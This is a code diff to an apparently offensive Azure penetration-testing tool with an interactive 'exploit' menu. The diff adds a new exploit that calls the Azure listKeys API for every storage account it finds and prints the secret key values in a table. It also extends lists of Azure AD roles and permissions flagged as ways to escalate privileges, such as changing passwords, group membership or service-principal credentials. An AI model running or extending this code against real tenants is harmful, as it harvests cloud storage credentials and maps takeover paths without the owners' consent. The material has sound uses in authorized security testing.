@@ -16,6 +16,7 @@ import ssl
 Token = None
 accessTokenGraph = None
 accessTokenVault = None
+storageAccessToken = None
 TotalTargets = []
 TargetSubscription = None
 TargetTenantId = None
@@ -188,9 +189,12 @@ def initToken(token, resetscopes):
         hasGraphAccess = False
         hasVaultEnabled = False
     Token = token
-    listSubs = ListSubscriptionsForToken()
-    TargetSubscription = listSubs['value'][0]['subscriptionId']
-    TargetTenantId = parseTenantId()
+    try:
+        listSubs = ListSubscriptionsForToken()
+        TargetSubscription = listSubs['value'][0]['subscriptionId']
+        TargetTenantId = parseTenantId()
+    except KeyError:
+        pass
 
 
 def originitToken(token):
@@ -251,6 +255,11 @@ def RD_ListAllVMs():
                 item['resourceGroup'] = res['name']
                 result.append(item)
     return result
+
+def ContainerACL(storageAccount):
+    global storageAccessToken
+    r = sendGETRequest("https://"+storageAccount+".blob.core.windows.net/dev?restype=container&comp=acl", accessTokenGraph)
+    return r["status_code"]
 
 def RD_ListAllUsers():
     global accessTokenGraph
@@ -443,6 +452,11 @@ def RD_ListAllVaults():
                 item['resourceGroup'] = res['name']
                 result.append(item)
     return result
+def RD_ListAllStorageAccountsKeys(AccId):
+    global Token
+    r = sendPOSTRequest("https://management.azure.com/"+AccId+"/listKeys?api-version=2022-05-01", None, Token)
+    return r['json']
+
 def RD_ListAllStorageAccounts():
     global Token
     result = []
@@ -451,6 +465,7 @@ def RD_ListAllStorageAccounts():
         for res in getResGroup(sub['subscriptionId'])['value']:
             rsVM = sendGETRequest("https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/resourceGroups/"+res['name']+"/providers/Microsoft.Storage/storageAccounts?api-version=2021-09-01", Token)
             for item in rsVM['json']['value']:
+
                 item['subscriptionId'] = sub['subscriptionId']
                 item['resourceGroup'] = res['name']
 
@@ -694,8 +709,8 @@ def canRoleBeAbused(currentRoleName):
     vaultAbuseCertAndKeysOnlyRoles = ["Key Vault Certificates Officer", "Key Vault Crypto Officer"]
     shadowRisks = ["Cloud Application Administrator", "Application Administrator", "Password Administrator",
                    "Privileged Authentication Administrator", "Authentication Administrator",
-                   "Privileged Role Administrator", "User Account Administrator", "User Administartor",
-                   "Helpdesk Administartor"]
+                   "Privileged Role Administrator", "User Account Administrator", "User Administrator", "User Access Administrator",
+                   "Helpdesk Administrator", "Directory Synchronization Accounts", "Hybrid Identity Administrator"]
     classicAdministartors = ["Account Administrator", "Service Administrator", "Co-Administrator"]
     if currentRoleName in vaultAbuseRoles:
         return currentRoleName + "|" + "allows to retrieve secrets from key vault."
@@ -709,6 +724,8 @@ def canRoleBeAbused(currentRoleName):
         return currentRoleName + "|" + "Can read everything in Azure AD, without the ability to update."
     elif currentRoleName == "Global Administrator" or currentRoleName == "Company Administrator":
         return currentRoleName + "|" + "has a god mode, which can manage all aspects of Azure AD. (think like Domain Admin)"
+    elif currentRoleName == "User Administrator" or currentRoleName == "Groups Administrators" or currentRoleName == "Directory Writers":
+        return currentRoleName + "|" + "has permissions to modify group membership in Azure AD."
     elif currentRoleName == "Virtual Machine Contributor":
         return currentRoleName + "|" + "allows manage of VMs including disks, snapshots, extensions, and password restoration."
     elif currentRoleName == "Automation Operator" or currentRoleName == "Automation Contributor":
@@ -718,7 +735,7 @@ def canRoleBeAbused(currentRoleName):
     elif currentRoleName == "User Access Administrator":
         return currentRoleName + "|" + "has manage access to all resources within the subscription."
     elif currentRoleName in shadowRisks:
-        return currentRoleName + "|" + " has full directory admin rights, easy way to esclate."
+        return currentRoleName + "|" + " has full directory admin rights, easy way to esclate (i.e. use change password)."
     elif currentRoleName in classicAdministartors:
         return currentRoleName + "|" + "Is found as one of the three classic subscription administrative roles. Please notice: Service Administrator and Account Administrator are equivalent to the Owner role in the subscription."
     elif currentRoleName == "Owner":
@@ -743,6 +760,10 @@ def canPermissionBeAbused(currentPermission):
                             "Microsoft.Storage/listServiceSas/action"]
     ARMTemplateAbuse = ["Microsoft.Resources/deployments/*"]
     DirectoryAbuse = ["Microsoft.Resources/deployments/*"]
+    AllowGroupModify = ["microsoft.directory/groups/members/update"]
+    AllowUserCreation = ["microsoft.directory/users/create"]
+    allowsSPCreation = ["microsoft.directory/servicePrincipals/create"]
+    allowsSPUpdate = ["microsoft.directory/servicePrincipals/credentials/update"]
     ExtensionsAbuse = ["Microsoft.ClassicCompute/virtualMachines/extensions/*",
                        "Microsoft.Compute/virtualMachines/extensions/read",
                        "Microsoft.Compute/virtualMachines/extensions/write"]
@@ -759,8 +780,16 @@ def canPermissionBeAbused(currentPermission):
         return "" + "|" + "That's means to have a Contributor/Owner permission on resources."
     elif currentPermission in vmPermissions:
         return currentPermission + "|" + "allows execute code on Virtual Machines."
+    elif currentPermission in allowsSPCreation:
+        return currentPermission + "|" + "allows creation of new application registration (service principle)."
+    elif currentPermission in allowsSPUpdate:
+        return currentPermission + "|" + "allows add service principle for an existing application registration."
+    elif currentPermission in AllowGroupModify:
+        return currentPermission + "|" + "allows modify group membership in Azure AD."
+    elif currentPermission in AllowUserCreation:
+        return currentPermission + "|" + "allows new user creation in Azure AD."
     elif currentPermission in vmAllowDeployPermission:
-        return currentPermission + "|" + "allows VM deployment or configuraiton of existing VM."
+        return currentPermission + "|" + "allows VM deployment or configuration of existing VM."
     elif currentPermission in StorangeAccountAbuse:
         return currentPermission + "|" + "can abuse storage accounts (i.e., view blobs)."
     elif currentPermission in ARMTemplateAbuse:
@@ -1009,7 +1038,6 @@ def attackWindow():
     print(banner)
     '''
     supportedCommands = [
-        "test",
         "whoami",
         "scopes",
         "get_subs",
@@ -1045,8 +1073,9 @@ def attackWindow():
         "Reader/ListAppServiceSites",
         "Reader/ListVirtualMachines",
         "Reader/ListAllStorageAccounts",
+        "Reader/ListStorageAccountsKeys",
         "Reader/ARMTemplatesDisclosure",
-        "Reader/ListServicePrincipal",
+        "Reader/ListServicePrincipals",
         "Reader/abuseServicePrincipals",
         "Contributor/ListACRCredentials",
         "Contributor/ReadVaultSecret",
@@ -1076,9 +1105,6 @@ def attackWindow():
                 print("Use run command only within an exploit.")
             elif mode == "whoami":
                 currentProfile()
-            elif mode == "test":
-                x = sendGETRequest("https://management.azure.com/subscriptions/?api-version=2017-05-10", Token)
-                print(dict(x['headers'])['Content-Type'])
             elif mode == "scopes":
                 currentScope()
             elif mode == "get_subs" or mode == "subs":
@@ -1544,6 +1570,30 @@ def attackWindow():
                         )
                         AllStorageAccountRecordsCount += 1
                     print(make_table(field_names, rows))
+            elif "Reader/ListStorageAccountsKeys" in ExploitChoosen and mode == "run":
+                print("Trying to list all storage accounts keys.. (it might take a few minutes)")
+                if len(RD_ListAllStorageAccounts()) < 1:
+                    print("No Storage Accounts were found.")
+                else:
+                    field_names = ["#", "Name", "Location", "Type", "Key", "Value", "Permissions", "Resource Group"]
+                    rows = []
+                    AllStorageAccountRecordsCount = 0
+                    for SARecord in RD_ListAllStorageAccounts():
+                        Data = RD_ListAllStorageAccountsKeys(SARecord['id'])
+                        for key in Data['keys']:
+                            rows.append(
+                                {"#": AllStorageAccountRecordsCount,
+                                 "Name": SARecord['name'],
+                                 "Location": SARecord['location'],
+                                 "Type": SARecord['type'],
+                                 "Key": key['keyName'],
+                                 "Value": key['value'],
+                                 "Permissions": key['permissions'],
+                                 "Resource Group": SARecord['resourceGroup']
+                                 }
+                            )
+                            AllStorageAccountRecordsCount += 1
+                    print(make_table(field_names, rows))
             elif "Reader/ListAllVaults" in ExploitChoosen and mode == "run":
                 print("Trying to list all vaults.. (it might take a few minutes)")
                 if len(RD_ListAllVaults()) < 1:
@@ -1599,7 +1649,7 @@ def attackWindow():
                             )
                         AllVMRecordsCount += 1
                     print(make_table(field_names, rows))
-            elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
+            elif "Reader/ListServicePrincipals" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all service principles (App registrations)..")
                 if len(RD_AddAppSecret()) < 1:
                     print("No Apps registrations were found.")
